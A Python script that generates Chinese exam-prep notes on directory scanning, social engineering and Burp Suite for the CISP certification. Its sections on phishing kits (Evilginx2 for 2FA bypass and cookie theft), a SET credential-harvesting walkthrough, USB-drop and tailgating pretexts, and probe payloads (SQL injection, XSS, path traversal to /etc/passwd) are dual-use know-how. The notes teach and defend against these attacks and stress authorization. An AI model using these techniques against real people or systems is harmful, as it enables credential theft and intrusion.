| 2 | Gobuster dir模式 | ★★★★ | ★★ | gobuster dir -u URL -w wordlist |
| 3 | FFUF核心语法 | ★★★ | ★★ | ffuf -u URL/FUZZ -w wordlist |
| 4 | Dirb常用参数 | ★★★ | ★ | -X扩展名, -r递归, -H请求头 |
| 5 | 状态码含义 | ★★★★★ | ★ | 200成功, 301/302重定向, 403禁止, 404不存在 |
| 6 | .git泄露 | ★★★★ | ★★ | /.git/HEAD 确认泄露，GitHacker下载 |
| 7 | 备份文件后缀 | ★★★ | ★ | .bak, .old, .backup, .save, ~ |
| 8 | WAF绕过 | ★★★ | ★★★ | User-Agent伪装、延迟、代理轮换 |
| 9 | 字典选择 | ★★★ | ★★ | SecLists、Dirbuster、RAFT |
| 10 | 结果过滤 | ★★★ | ★★ | -fs/-fw/-fl 过滤，-fc/-mc 状态码过滤 |

### 💡 知识巧记口诀

> **"目录扫描三步走"** — 一用Gobuster快速扫（广度）、二用FFUF精细过滤（深度）、三用Dirsearch递归枚举（全面）。记住：**"快扫深滤全枚举"**。

> **"敏感路径五兄弟"** — admin（管理后台）、backup（备份文件）、config（配置文件）、.git（源码泄露）、.env（环境变量）。记住：**"管备配源环"**。

> **"状态码判断法"** — 200直接看、301/302跟重定向、403记下来（可能有权限问题）、404直接过滤。记住：**"看跟记滤"**。

### 🎯 考试陷阱提醒

| 陷阱 | 正确理解 |
|:---|:---|
| "404就是不存在" | ❌ 不绝对！某些WAF用404隐藏敏感路径 |
| "200就是有效页面" | ❌ 不绝对！很多站点对所有路径返回200 |
| "目录扫描不需要授权" | ❌ 错误！目录扫描是主动行为，需要授权 |
| "大字典一定更好" | ❌ 不一定！字典过大耗时且更容易触发WAF |
| "只扫描一种扩展名" | ❌ 不全面！应覆盖 .php/.asp/.jsp/.bak 等 |

---

## 学习建议

1. 🛠️ **建立字典库**：收集和整理 SecLists、RAFT 等高质量字典，按场景分类
2. 🔄 **多工具组合使用**：Gobuster（快速）+ FFUF（过滤）+ Dirsearch（递归）形成完整工作流
3. 🧪 **搭建测试环境**：安装 DVWA、bWAPP 等靶场，练习目录扫描
4. 📊 **学会结果分析**：不要只看200响应，301/302/403/401 都可能是攻击入口
5. ⚡ **掌握过滤技巧**：-fs、-fw、-fc、-fr 是FFUF的核心竞争力

---

> **目录扫描是Web渗透测试的"侦察兵"——在扣动扳机之前，你需要的不是最好的武器，而是最全的地图。每一个隐藏路径都可能是通往核心系统的捷径。**
""")

print("\nDays 1-6 done, continuing with days 7-12...")

# ===================================================================
# Day 7：社工信息收集
# ===================================================================
gen('day-7.md', """# Day 7：社工信息收集

> **📘 文档定位**：CISP 考试核心基础 | 难度：入门 | 预计阅读：40 分钟
>
> 社会工程学（Social Engineering）是渗透测试中最古老也最有效的攻击向量之一。技术防御再坚固，也挡不住一个精心设计的钓鱼邮件或一通伪装电话。在渗透测试中，社工信息收集的目的是构建目标组织的人员画像，发现可利用的"人性漏洞"。人，永远是安全体系中最薄弱的环节。

---

## 导航目录

- [一、社会工程学概述](#一社会工程学概述)
- [二、OSINT开源情报收集](#二osint开源情报收集)
- [三、社交媒体信息挖掘](#三社交媒体信息挖掘)
- [四、邮件信息收集与钓鱼准备](#四邮件信息收集与钓鱼准备)
- [五、密码泄露信息查询](#五密码泄露信息查询)
- [六、钓鱼攻击技术与工具](#六钓鱼攻击技术与工具)
- [七、物理社工技术](#七物理社工技术)
- [八、社工工具包(SET)实战](#八社工工具包set实战)
- [九、社工防御策略](#九社工防御策略)
- [十、高分考点与知识巧记](#十高分考点与知识巧记)

---

## 一、社会工程学概述

### 1.1 社会工程学定义

社会工程学是通过心理操控、欺骗等手段，诱导人们泄露敏感信息或执行特定操作的技术。它攻击的不是系统漏洞，而是**人的信任和认知偏差**。

```
社工攻击的攻击面：
┌────────────────────────────────────────┐
│              人的漏洞                    │
├────────────────────────────────────────┤
│  好奇心 → 点击恶意链接                   │
│  恐惧感 → 立即配合"紧急"要求              │
│  信任感 → 相信"IT部门"的电话              │
│  贪婪心 → 被"中奖"信息诱惑                │
│  懒惰心 → 使用弱密码、不更新系统          │
│  责任感 → 帮助"老板"解决紧急问题          │
│  从众心 → "别人都点了"                   │
└────────────────────────────────────────┘
```

### 1.2 社工攻击分类

| 攻击类型 | 描述 | 典型场景 |
|:---|:---|:---|
| 钓鱼攻击 | 伪装合法实体发送欺诈邮件/消息 | 仿冒银行邮件要求验证账号 |
| 鱼叉钓鱼 | 针对特定个人/组织的定向钓鱼 | 针对CEO的个性化钓鱼邮件 |
| 捕鲸攻击 | 针对高级管理层的钓鱼 | 伪装成合作伙伴的邮件 |
| 电话社工 | 通过电话获取信息 | 伪装IT部门要求提供密码 |
| 尾随攻击 | 物理跟随进入受限区域 | 假装忘带门禁卡 |
| 诱饵攻击 | 使用物理介质引诱 | USB掉落攻击 |
| 伪装攻击 | 假冒身份获取信任 | 伪装成维修人员 |
| 水坑攻击 | 感染目标常访问的网站 | 在行业论坛植入恶意代码 |

> **🔑 高分考点**：社工攻击的四个阶段——**信息收集**（研究目标）、**建立信任**（建立关系）、**利用信任**（获取信息/权限）、**执行攻击**（达成目的）。

---

## 二、OSINT开源情报收集

### 2.1 OSINT框架

OSINT（Open Source Intelligence）是利用公开信息源收集情报的技术：

```bash
# OSINT信息源分类
1. 搜索引擎
   - Google, Bing, DuckDuckGo, Yandex, Baidu
2. 社交媒体
   - LinkedIn, Twitter, Facebook, Instagram, WeChat
3. 代码仓库
   - GitHub, GitLab, Bitbucket, Gitee
4. 数据泄露库
   - Have I Been Pwned, DeHashed, LeakCheck
5. 域名/IP
   - Shodan, Censys, ZoomEye, Fofa
6. 商业信息
   - 天眼查, 企查查, Crunchbase
7. 文档元数据
   - FOCA, Metagoofil
8. 暗网情报
   - Tor, I2P, ZeroNet
```

### 2.2 OSINT工具链

```bash
# Maltego - 图形化OSINT分析
# 安装：sudo apt install maltego
# 功能：信息关联、社交图谱、域名关系

# theHarvester - 邮件/域名信息收集
theHarvester -d example.com -b linkedin,google,shodan -f results.html

# Sherlock - 社交媒体用户名搜索
python3 sherlock.py username
python3 sherlock.py username1 username2 --output results/

# Holehe - 邮箱注册站点检查
holehe user@example.com

# PhoneInfoga - 电话号码信息收集
phoneinfoga scan -n +8613800138000
phoneinfoga serve -p 8080  # Web界面

# SpiderFoot - 自动化OSINT
python3 sf.py -s example.com -t all -o csv
spiderfoot -l 127.0.0.1:5001  # Web界面
```

---

## 三、社交媒体信息挖掘

### 3.1 LinkedIn信息收集

LinkedIn是企业信息泄露的"金矿"：

```bash
# LinkedIn可获取的信息
- 员工姓名、职位、部门
- 技术栈（从个人技能推断）
- 组织架构（从层级关系推断）
- 公司邮箱格式（从联系方式推断）
- 新入职员工（安全意识可能较弱）
- 离职员工（可能有未注销的账号）

# 使用theHarvester收集LinkedIn信息
theHarvester -d example.com -b linkedin

# LinkedInt - LinkedIn信息收集工具
python3 linkedin.py -d example.com

# 手动分析技巧
# 1. 搜索 "公司名 IT 管理员" → 发现IT团队
# 2. 搜索 "公司名 安全" → 发现安全团队
# 3. 搜索 "公司名 实习生" → 安全培训可能不足
# 4. 搜索 "公司名 离职" → 发现已离职但账号未注销
```

### 3.2 Twitter/X信息收集

```bash
# Twint - Twitter信息收集
twint -u username --followers
twint -s "company name" --since 2023-01-01

# 搜索员工推文
# 常见泄露信息：
# - 办公环境照片（暴露屏幕内容、内部系统）
# - 技术讨论（暴露技术栈、架构）
# - 吐槽公司（暴露安全措施）
# - 会议/活动照片（暴露工牌格式）
```

### 3.3 其他社交平台

```bash
# Instagram
# - 办公环境照片
# - 团建活动照片
# - 工牌/工作证格式

# Facebook
# - 个人关系网络
# - 生日信息（可能的密码组成）
# - 兴趣爱好（可能的密码组成）

# GitHub
# - 个人项目（暴露编码习惯、工具偏好）
# - 公司项目（配置泄露、密钥泄露）
# - Star/Watch（关注的安全工具，反推防御措施）
```

---

## 四、邮件信息收集与钓鱼准备

### 4.1 邮件地址收集

```bash
# 邮箱格式推断
# 常见企业邮箱格式：
firstname.lastname@company.com
f.lastname@company.com
firstname@company.com
firstname_lastname@company.com
firstnamelastname@company.com

# Hunter.io - 邮箱查找和验证
curl "https://api.hunter.io/v2/domain-search?domain=example.com&api_key=YOUR_KEY"

# EmailHarvester
python3 EmailHarvester.py -d example.com -s 50

# 批量验证邮箱
# 通过密码找回功能测试
# 通过注册页面测试
# 通过SMTP VRFY（大部分已禁用）
```

### 4.2 邮箱安全分析

```bash
# SPF记录分析（防邮件伪造）
dig example.com TXT | grep "v=spf1"
# -all: 严格拒绝（安全）
# ~all: 软拒绝（可绕过）
# ?all: 中性（无保护）

# DMARC记录分析
dig _dmarc.example.com TXT
# p=none: 仅报告（不拦截）
# p=quarantine: 隔离可疑邮件
# p=reject: 拒绝（最安全）

# DKIM检测
dig default._domainkey.example.com TXT
dig google._domainkey.example.com TXT

# 邮件服务器检测
dig example.com MX
# 检查MX服务器的安全配置
```

---

## 五、密码泄露信息查询

### 5.1 密码泄露数据库

```bash
# Have I Been Pwned API
curl "https://haveibeenpwned.com/api/v3/breachedaccount/user@example.com"
# 检查邮箱是否在数据泄露中出现

# 密码泄露搜索
# DeHashed - 付费API
# LeakCheck - 付费API
# SnusBase - 付费API

# 使用H8mail查询
h8mail -t user@example.com
h8mail -t targets.txt -o results.json

# 使用Breach-Parse
python3 breach-parse.py @company.com output_dir/

# 本地密码泄露库查询
grep -r "user@example.com" /path/to/breach/data/
```

### 5.2 密码分析

```python
# 密码模式分析
# 从泄露数据中分析目标组织的密码习惯
# 常见密码模式：
# - 公司名 + 数字（如 Company123）
# - 部门名 + 年份（如 IT2023）
# - 产品名 + 特殊字符（如 Product@2023）
# - 季节 + 年份（如 Spring2023!）

# 生成定制化密码字典
# 基于收集到的信息：
# - 公司名称变体
# - 员工姓名变体
# - 产品名称
# - 重要日期（成立日期、上市日期）
# - 常见弱密码变体
```

---

## 六、钓鱼攻击技术与工具

### 6.1 钓鱼邮件构建

```bash
# Gophish - 开源钓鱼框架
# 安装
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
./gophish

# 功能：
# - 邮件模板管理
# - 目标用户管理
# - 钓鱼页面克隆
# - 点击/提交追踪
# - 统计分析面板

# Modlishka - 反向代理钓鱼
./modlishka -config templates.json

# Evilginx2 - 高级中间人钓鱼框架
evilginx2 -p phishlets/
# 支持2FA绕过
# 支持Session Cookie窃取

# 邮件伪造技术
# 1. SPF配置不当 - 直接伪造发件人
# 2. 相似域名 - 注册 example-co.com
# 3. 显示名欺骗 - 显示名为 "IT Support"
# 4. Reply-To 篡改 - 回复地址伪装
```

### 6.2 钓鱼页面克隆

```bash
# SET (Social-Engineer Toolkit)
setoolkit
# 选择: 1) Social-Engineering Attacks
#       2) Website Attack Vectors
#       3) Credential Harvester Attack Method
#       2) Site Cloner

# 克隆目标登录页面
# 修改登录表单action指向攻击者服务器
# 部署到相似域名的服务器

# 使用pyPhisher
python3 pyphisher.py

# 使用Zphisher
bash zphisher.sh
```

---

## 七、物理社工技术

### 7.1 尾随攻击

```text
尾随攻击（Tailgating）技术：
1. 假装打电话，跟随员工进入
2. 双手抱满东西，请求他人帮忙开门
3. 假装快递/外卖人员
4. 谎称忘带门禁卡
5. 选择吸烟时间（多人同时进出）
6. 选择午餐时间（人流量大）
```

### 7.2 USB掉落攻击

```bash
# USB Rubber Ducky 攻击
# 模拟键盘输入，执行预设的恶意命令
# 打开PowerShell下载执行payload
# 添加管理员用户

# 恶意USB制作
# 1. 创建autorun.inf（Windows）
# 2. 放入伪装成"重要文件"的恶意程序
# 3. 标签写上"工资表"、"年终奖"等吸引点击

# Bash Bunny
# 高级USB攻击平台
# 支持多种攻击模式
# 可以模拟以太网适配器
```

### 7.3 伪装技术

```text
常见伪装身份：
1. IT支持人员 - "我来修电脑"
2. 快递员 - "有您的快递，需要签收"
3. 保洁人员 - 可以进入办公区域
4. 新员工 - "我是新来的，还没办门禁卡"
5. 合作伙伴 - "约了XX经理开会"
6. 维修工 - "空调/网络维修"
```

---

## 八、社工工具包(SET)实战

### 8.1 SET概述

SET（Social-Engineer Toolkit）是TrustedSec开发的专业社工攻击框架，集成在Kali Linux中：

```bash
# 启动SET
sudo setoolkit

# 主菜单选项
# 1) Social-Engineering Attacks       # 社工攻击
# 2) Penetration Testing (Fast-Track)  # 渗透测试
# 3) Third Party Modules               # 第三方模块
# 4) Update the Social-Engineer Toolkit # 更新
# 5) Update SET configuration          # 配置更新
# 6) Help, Credits, and About          # 帮助

# 社工攻击子菜单
# 1) Spear-Phishing Attack Vectors     # 鱼叉钓鱼
# 2) Website Attack Vectors            # 网站攻击
# 3) Infectious Media Generator        # 感染介质
# 4) Create a Payload and Listener     # Payload生成
# 5) Mass Mailer Attack                # 批量邮件
# 6) Arduino-Based Attack Vector       # Arduino攻击
# 7) Wireless Access Point Attack      # 无线AP攻击
# 8) QRCode Generator Attack           # 二维码攻击
# 9) Powershell Attack Vectors         # PowerShell攻击
# 10) Third Party Modules              # 第三方
```

### 8.2 SET钓鱼实战

```bash
# 场景：对某公司进行钓鱼测试
# Step 1: 克隆目标登录页面
# SET → 1 → 2 → 3 → 2
# 输入目标URL：https://mail.company.com/owa

# Step 2: 配置监听
# SET自动配置Metasploit监听
# IP: 攻击者IP
# 端口: 443

# Step 3: 发送钓鱼邮件
# SET → 1 → 1
# 选择邮件模板
# 自定义邮件内容

# Step 4: 收集凭证
# 目标点击链接并输入凭证后
# SET自动记录用户名和密码
# 存储在SET reports目录
```

---

## 九、社工防御策略

### 9.1 技术防御

| 防御措施 | 描述 | 有效性 |
|:---|:---|:---|
| 邮件安全网关 | 过滤钓鱼邮件、检测恶意附件 | 高 |
| DMARC/DKIM/SPF | 邮件认证，防伪造 | 高 |
| 多因素认证 | 即使密码泄露也无法登录 | 极高 |
| URL重写/检测 | 实时检测钓鱼链接 | 中 |
| 沙箱检测 | 在隔离环境分析邮件附件 | 高 |
| 数据防泄露(DLP) | 阻止敏感信息外泄 | 中 |

### 9.2 人员培训

```text
安全意识培训重点：
1. 识别钓鱼邮件：检查发件人地址、链接URL、附件类型
2. 验证请求：通过第二渠道确认敏感操作请求
3. 不泄露信息：不向未验证身份的人提供信息
4. 报告可疑：发现可疑邮件/电话立即报告
5. 定期演练：每季度进行模拟钓鱼测试
6. 物理安全：不尾随、不帮陌生人开门
```

> **🔑 高分考点**：社工防御的核心策略是**"技术+流程+人员"三位一体**。技术手段防外部攻击，流程规范防内部疏忽，安全意识培训防人为失误。

---

## 十、高分考点与知识巧记

### 📌 高分考点速查表

| 序号 | 考点 | 考试频率 | 难度 | 关键答案 |
|:---:|:---|:---:|:---:|:---|
| 1 | 社工攻击定义 | ★★★★ | ★ | 利用人的心理弱点获取信息/权限 |
| 2 | 钓鱼攻击类型 | ★★★★ | ★★ | 普通钓鱼、鱼叉钓鱼、捕鲸攻击 |
| 3 | OSINT定义 | ★★★★ | ★★ | 从公开信息源收集情报 |
| 4 | SPF/DKIM/DMARC | ★★★★ | ★★ | 邮件认证三协议 |
| 5 | SET工具包 | ★★★ | ★★ | Social-Engineer Toolkit |
| 6 | 尾随攻击 | ★★★ | ★ | 物理跟随进入受限区域 |
| 7 | USB掉落攻击 | ★★★ | ★★ | 在公共场所放置恶意USB |
| 8 | Gophish | ★★★ | ★★ | 开源钓鱼测试框架 |
| 9 | 社工四阶段 | ★★★ | ★★ | 信息收集→建立信任→利用信任→执行 |
| 10 | 社工防御 | ★★★ | ★★ | 技术+流程+人员三位一体 |

### 💡 知识巧记口诀

> **"社工攻击六心理"** — 好奇心、恐惧感、信任感、贪婪心、懒惰心、责任感。记住：**"好怕信贪懒责"**——好奇、恐惧、信任、贪婪、懒惰、责任。

> **"钓鱼三剑客"** — SPF定谁能发、DKIM验是否篡改、DMARC定违规怎么处理。记住：**"SPF定人、DKIM验身、DMARC定罚"**。

> **"OSINT五来源"** — 搜索引擎、社交媒体、代码仓库、数据泄露、域名信息。记住：**"搜社码数域"**。

### 🎯 考试陷阱提醒

| 陷阱 | 正确理解 |
|:---|:---|
| "社工攻击都是技术很低的" | ❌ 错误！高级社工攻击技术含量很高（如APTs） |
| "DMARC能完全防止邮件伪造" | ❌ 错误！DMARC仅对已配置的域名有效 |
| "社工测试不需要授权" | ❌ 错误！社工测试涉及人员隐私，必须单独授权 |
| "密码泄露数据库不可靠" | ❌ 部分可靠！Have I Been Pwned 等是合法可靠的服务 |

---

## 学习建议

1. 📚 **学习心理学基础**：了解Cialdini的六大影响力原则
2. 🔧 **搭建钓鱼测试环境**：使用Gophish + 自建邮件服务器进行合法测试
3. 🎯 **定期安全演练**：组织模拟钓鱼测试，评估员工安全意识
4. 🛡️ **配置邮件安全**：确保DMARC/DKIM/SPF正确配置
5. ⚖️ **牢记法律底线**：社工测试必须获得明确授权

---

> **技术防御再坚固，也挡不住一个精心设计的"IT部门电话"。人，永远是安全体系中最薄弱的环节，也是最需要投资的部分。**
""")

# ===================================================================
# Day 8：Burp Suite核心功能
# ===================================================================
gen('day-8.md', """# Day 8：Burp Suite核心功能

> **📘 文档定位**：CISP 考试核心基础 | 难度：中级 | 预计阅读：45 分钟
>
> Burp Suite是Web应用安全测试的事实标准工具。它不仅仅是一个HTTP代理，而是一个集成了代理拦截、爬虫、扫描器、重放器、解码器、比对器等功能的综合测试平台。全球95%以上的Web渗透测试工程师都在使用Burp Suite。掌握Burp Suite，就等于掌握了Web安全测试的核心生产力工具。

---

## 导航目录

- [一、Burp Suite概述与安装](#一burp-suite概述与安装)
- [二、Proxy代理模块深度解析](#二proxy代理模块深度解析)
- [三、Repeater重放模块](#三repeater重放模块)
- [四、Intruder攻击模块](#四intruder攻击模块)
- [五、Scanner扫描器模块](#五scanner扫描器模块)
- [六、Spider与内容发现](#六spider与内容发现)
- [七、Decoder与Comparer](#七decoder与comparer)
- [八、Burp扩展生态](#八burp扩展生态)
- [九、Burp Suite高级配置](#九burp-suite高级配置)
- [十、高分考点与知识巧记](#十高分考点与知识巧记)

---

## 一、Burp Suite概述与安装

### 1.1 Burp Suite版本对比

| 功能 | Community(社区版) | Professional(专业版) | Enterprise(企业版) |
|:---|:---:|:---:|:---:|
| 手动测试工具 | ✓ | ✓ | ✓ |
| 拦截代理 | ✓ | ✓ | ✓ |
| Repeater | ✓ | ✓ | ✓ |
| Intruder(限速) | ✓ | ✓ | ✓ |
| 自动扫描器 | ✗ | ✓ | ✓ |
| 定时扫描 | ✗ | ✗ | ✓ |
| CI/CD集成 | ✗ | ✗ | ✓ |
| REST API | ✗ | ✗ | ✓ |
| 价格 | 免费 | $449/年 | 按需报价 |

### 1.2 Burp Suite架构

```
Burp Suite核心架构：
┌─────────────────────────────────────────┐
│              Burp Suite                   │
├─────────────────────────────────────────┤
│  ┌─────────┐  ┌──────────┐  ┌────────┐ │
│  │  Proxy  │→│  Target  │→│ Spider │ │
│  │ (拦截)  │  │ (站点地图)│  │ (爬虫)  │ │
│  └────┬────┘  └────┬─────┘  └───┬────┘ │
│       ↓            ↓            ↓       │
│  ┌─────────┐  ┌──────────┐  ┌────────┐ │
│  │Repeater│  │ Intruder │  │Scanner │ │
│  │ (重放)  │  │ (攻击)   │  │ (扫描)  │ │
│  └─────────┘  └──────────┘  └────────┘ │
│  ┌─────────┐  ┌──────────┐             │
│  │ Decoder │  │Comparer  │             │
│  │ (编解码) │  │ (对比)    │             │
│  └─────────┘  └──────────┘             │
│  ┌──────────────────────────────┐       │
│  │       Extender (扩展)        │       │
│  │  BApp Store - 400+ extensions│       │
│  └──────────────────────────────┘       │
└─────────────────────────────────────────┘
```

### 1.3 代理配置

```bash
# 浏览器代理配置
# HTTP Proxy: 127.0.0.1:8080
# HTTPS Proxy: 127.0.0.1:8080

# Firefox代理配置
# 设置 → 网络设置 → 手动代理配置
# HTTP代理: 127.0.0.1 端口: 8080
# 勾选"也将此代理用于HTTPS"

# Burp CA证书安装
# 访问 http://burpsuite 下载CA证书
# Firefox: 设置 → 隐私与安全 → 证书 → 导入
# Chrome: 设置 → 隐私和安全 → 安全 → 管理证书

# 系统代理配置
# Kali Linux:
export http_proxy="http://127.0.0.1:8080"
export https_proxy="http://127.0.0.1:8080"

# 命令行工具使用Burp代理
curl -x http://127.0.0.1:8080 https://target.com
sqlmap -u "http://target.com/page.php?id=1" --proxy=http://127.0.0.1:8080
```

> **🔑 高分考点**：Burp Suite默认监听 `127.0.0.1:8080`，需要通过浏览器配置代理或安装CA证书才能拦截HTTPS流量。

---

## 二、Proxy代理模块深度解析

### 2.1 拦截功能

```
HTTP History 关键列说明：
#    - 请求序号
Host - 目标主机
Method - HTTP方法(GET/POST/PUT/DELETE)
URL - 请求路径
Params - 参数数量
Status - 响应状态码
Length - 响应长度
MIME type - 内容类型
Extension - 文件扩展名
Title - 页面标题
Comment - 注释
TLS - 是否使用TLS
IP - 目标IP
Cookies - Cookie信息
Time - 请求时间
Listener port - 监听端口
```

### 2.2 拦截规则

```bash
# Intercept 规则配置
# Proxy → Options → Intercept Client Requests
# 或 Intercept Server Responses

# 常用拦截规则：
# 1. 仅拦截特定域名的请求
# Boolean operator: And
# Match type: Domain name
# Match relationship: Matches
# Match condition: *.target.com

# 2. 仅拦截包含特定参数的请求
# Boolean operator: And
# Match type: URL
# Match relationship: Contains
# Match condition: id=

# 3. 不拦截静态资源
# Boolean operator: And
# Match type: File extension
# Match relationship: Does not match
# Match condition: (css|js|png|jpg|gif|ico|woff|svg)

# 4. 请求/响应修改规则
# 自动添加/修改请求头
# 自动替换响应内容
```

### 2.3 HTTP History过滤

```bash
# 过滤器配置（Filter栏）
# Filter by request type:
# ☑ Show only in-scope items
# ☐ Hide items without responses
# ☐ Show only parameterized requests

# Filter by MIME type:
# ☑ HTML
# ☑ Script (JS/JSON)
# ☑ XML
# ☑ CSS
# ☑ Images
# ☑ Other text
# ☐ Other binary

# Filter by status code:
# ☑ 2xx Success
# ☑ 3xx Redirection
# ☑ 4xx Client Error
# ☑ 5xx Server Error

# Filter by search term:
# 在搜索框中输入关键词，高亮匹配项
```

---

## 三、Repeater重放模块

### 3.1 Repeater基础操作

Repeater是手动测试的核心工具，允许你修改并重放单个HTTP请求：

```bash
# Repeater操作流程
# 1. 从Proxy/History中右键 → Send to Repeater
# 2. 在Repeater中修改请求
# 3. 点击"Send"发送
# 4. 观察响应

# 快捷键
# Ctrl+R: 从Proxy发送到Repeater
# Ctrl+Space: 在Repeater中发送请求
# Ctrl+Shift+R: 跳转到Repeater
```

### 3.2 Repeater高级技巧

```bash
# 1. 请求参数修改
# 原始请求：
GET /product.php?id=1 HTTP/1.1

# 修改为：
GET /product.php?id=1' HTTP/1.1          # 测试SQL注入
GET /product.php?id=<script>alert(1)</script>  # 测试XSS
GET /product.php?id=../../etc/passwd     # 测试路径遍历

# 2. HTTP方法切换
# GET → POST → PUT → DELETE → OPTIONS → HEAD

# 3. 请求头注入
GET /page HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1              # IP欺骗
X-Forwarded-Host: evil.com              # Host头注入
X-Original-URL: /admin                  # URL覆盖
Authorization: Basic YWRtaW46YWRtaW4=   # 基础认证

# 4. 多标签页管理
# 使用不同标签页测试不同参数
# 使用数字编号组织测试步骤
# 使用注释记录测试结果
```

### 3.3 Repeater请求历史

```bash
# 查看请求历史
# Repeater左上角历史面板
# 记录每次发送的请求和响应
# 可以回退到之前的请求
# 支持重命名和注释
```

---

## 四、Intruder攻击模块

### 4.1 Intruder概述

Intruder是Burp Suite的自动化攻击模块，用于对Web应用进行参数化攻击测试：

```
Intruder攻击流程：
1. 选择攻击位置（Payload Positions）
   - Sniper（狙击手）: 单个位置逐个测试
   - Battering Ram（攻城锤）: 多个位置使用相同Payload
   - Pitchfork（干草叉）: 多个位置使用不同Payload（一一对应）
   - Cluster Bomb（集束炸弹）: 多个位置使用不同Payload（笛卡尔积）

2. 配置Payload类型
   - Simple list（简单列表）
   - Runtime file（运行时文件）
   - Numbers（数字序列）
   - Dates（日期序列）
   - Brute forcer（暴力破解）
   - Custom iterator（自定义迭代器）

3. 配置攻击选项
   - 线程数
   - 重试次数
   - 超时时间
   - Grep匹配规则

4. 启动攻击并分析结果
```

### 4.2 Intruder攻击模式

```bash
# Sniper模式（单参数测试）
# 适用场景：测试单个参数的不同值
# 请求：
GET /page.php?user=§admin§&pass=§test§
# 效果：先对user位置使用所有payload，再对pass位置使用所有payload
# 总请求数 = len(payloads) × 位置数

# Battering Ram模式（多参数同值）
# 适用场景：多个位置使用相同payload
# 请求：
GET /page.php?user=§admin§&pass=§admin§
# 效果：user和pass始终使用相同的payload值

# Pitchfork模式（多参数一一对应）
# 适用场景：用户名密码一一对应测试
# Payload set 1: [admin, user, guest]
# Payload set 2: [admin123, user123, guest123]
# 效果：admin:admin123, user:user123, guest:guest123

# Cluster Bomb模式（多参数全组合）
# 适用场景：用户名密码全组合暴力破解
# Payload set 1: [admin, user]
# Payload set 2: [123, 456]
# 效果：admin:123, admin:456, user:123, user:456
# 总请求数 = len(set1) × len(set2)
```

### 4.3 Payload处理规则

```bash
# Payload处理规则
# 在Payloads → Payload Processing中配置

# 常用处理规则：
# 1. Add prefix - 添加前缀
# 2. Add suffix - 添加后缀
# 3. Match/replace - 查找替换
# 4. Substring - 提取子串
# 5. Reverse substring - 反向提取
# 6. Encode - 编码
#     - URL encode
#     - HTML encode
#     - Base64 encode
#     - ASCII hex encode
# 7. Decode - 解码
# 8. Hash - 哈希计算
#     - MD5, SHA-1, SHA-256, SHA-512

# 示例：生成常用密码变体
# Payload: password
# 处理链：
# 1. Add suffix: 123 → password123
# 2. Add suffix: ! → password123!
# 3. Add suffix: @ → password123!@
```

### 4.4 Grep匹配与结果分析

```bash
# Grep - Match（匹配标记）
# 在响应中搜索指定字符串
# 匹配则标记为 ✓
# 用于快速识别成功的测试

# 常用Grep匹配：
# SQL注入: "error in your SQL", "mysql_fetch", "ORA-"
# XSS: 直接匹配注入的payload
# 认证成功: "Welcome", "Dashboard", "Logout"
# 文件包含: "root:", "boot.ini"

# Grep - Extract（提取内容）
# 使用正则表达式从响应中提取内容
# 如：提取CSRF Token、Session ID

# 结果分析
# 按状态码排序
# 按响应长度排序
# 按响应时间排序
# 按Grep匹配排序
```

---

## 五、Scanner扫描器模块

### 5.1 Scanner功能概述

Scanner是Burp Pro版的核心功能，自动检测Web应用漏洞：

```bash
# Scanner检测的漏洞类型
# - SQL注入（多种类型）
# - XSS（反射型、存储型、DOM型）
# - CSRF
# - 命令注入
# - 路径遍历
# - 文件包含
# - XXE
# - 不安全的反序列化
# - 服务器端模板注入(SSTI)
# - 信息泄露
# - 安全配置错误
# - 不安全的Cookie配置
# - 跨域资源共享(CORS)配置错误

# 扫描模式
# 1. 主动扫描（Active Scan）
#    - 发送探测请求
#    - 可能修改数据
#    - 全面但可能造成影响
# 2. 被动扫描（Passive Scan）
#    - 仅分析正常流量
#    - 不发送额外请求
#    - 安全但覆盖面有限
```

### 5.2 Scanner配置

```bash
# 主动扫描配置
# Scanner → Active Scanning → Options

# 扫描速度
# - Fast: 快速但可能遗漏
# - Normal: 平衡
# - Thorough: 全面但耗时

# 扫描精度
# - Minimize false negatives: 减少漏报
# - Normal: 平衡
# - Minimize false positives: 减少误报

# 扫描范围控制
# Target → Scope → Include in scope
# 仅扫描scope内的URL
```

### 5.3 扫描结果分析

```bash
# Issue 严重程度分级
# High: 高危漏洞（SQL注入、命令执行、文件上传）
# Medium: 中危漏洞（XSS、CSRF、目录遍历）
# Low: 低危漏洞（信息泄露、Cookie未设置Secure）
# Information: 信息提示

# Issue 置信度
# Certain: 确定
# Firm: 基本确定
# Tentative: 暂定（需人工验证）

# 查看Issue详情
# 1. Issue背景描述
# 2. 漏洞复现步骤
# 3. 请求/响应证据
# 4. 修复建议
# 5. 参考链接（CVE/OWASP）
```

---

## 六、Spider与内容发现

### 6.1 Spider爬虫

```bash
# Spider功能
# 自动爬取Web应用的所有链接和内容
# 构建完整的站点地图

# Spider配置
# Spider → Options
# - 爬取深度
# - 线程数
# - 表单提交（自动/手动）
# - 爬取规则（包含/排除）
# - 应用登录（Session Handling）

# 手动爬取
# 右键 → Spider this host
# 右键 → Spider this branch

# 被动爬取
# 在浏览过程中自动发现链接
# 无需额外请求
```

### 6.2 内容发现

```bash
# Content Discovery (Pro版)
# 自动发现隐藏内容
# 类似于Gobuster/Dirb

# 配置
# - 字典文件
# - 文件扩展名
# - 递归深度
# - 发现策略
```

---

## 七、Decoder与Comparer

### 7.1 Decoder编解码

```bash
# Decoder支持的编解码
# URL Encode/Decode
# HTML Encode/Decode
# Base64 Encode/Decode
# Hex Encode/Decode
# ASCII Hex Encode/Decode
# GZip/Deflate
# 多种字符集转换

# 快捷键
# Ctrl+Shift+D: 发送到Decoder

# 使用场景
# 1. 解码Base64编码的Cookie
# 2. 解码URL编码的参数
# 3. 解码JWT Token
# 4. 多重编码分析
```

### 7.2 Comparer对比

```bash
# Comparer功能
# 对比两个请求/响应的差异
# 支持逐字对比和逐词对比
# 高亮差异部分

# 使用场景
# 1. 对比正常和注入后的响应差异
# 2. 对比不同权限用户的响应
# 3. 对比原始和修改后的请求
# 4. 分析盲注的时间/内容差异
```

---

## 八、Burp扩展生态

### 8.1 BApp Store

Burp Suite的BApp Store包含400+个扩展：

```bash
# 必装扩展推荐
# 1. Autorize - 自动授权测试
# 2. Turbo Intruder - 高速暴力破解（比Intruder快100倍）
# 3. Logger++ - 增强日志记录
# 4. JSON Web Tokens - JWT分析
# 5. Active Scan++ - 增强主动扫描
# 6. Retire.js - JS库漏洞检测
# 7. Software Vulnerability Scanner - 软件版本漏洞
